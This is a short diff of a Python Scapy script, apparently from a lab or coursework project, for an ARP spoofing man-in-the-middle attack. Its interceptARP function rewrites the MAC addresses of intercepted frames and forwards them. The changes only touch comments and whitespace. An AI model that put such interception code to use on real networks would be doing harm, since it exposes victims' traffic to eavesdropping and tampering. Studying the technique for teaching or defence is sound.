@@ -1,12 +1,11 @@
 from scapy.all import *
 from scapy.layers.inet import IP
 
-
+# Func gets pkt from ARP class which then forwards or not depending on ARP mode(var: forward)
 def interceptARP(pkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface, forward):
 
-    # print("I got here")
-    # case 1: victim request an IP which has as destination MAC of attacker
-    # find corresponding MAC to that IP in array of spoffed IPs and
+    # case 1: victim requests an IP which has as destination MAC of attacker
+    # find corresponding MAC to that IP in array of spoofed IPs and
     # put as destination to the new packet
     if pkt[Ether].dst == attackerMAC:
         if pkt.haslayer(IP):
@@ -21,7 +20,7 @@ def interceptARP(pkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterfa
             # maintain requested IP andresses under attacker MAC
             pkt[Ether].src = attackerMAC
 
-            
-            # send packet to the network
+
+            # send packet to the network only if forward is True
             if forward:
                 sendp(pkt, iface=networkInterface, verbose=0)
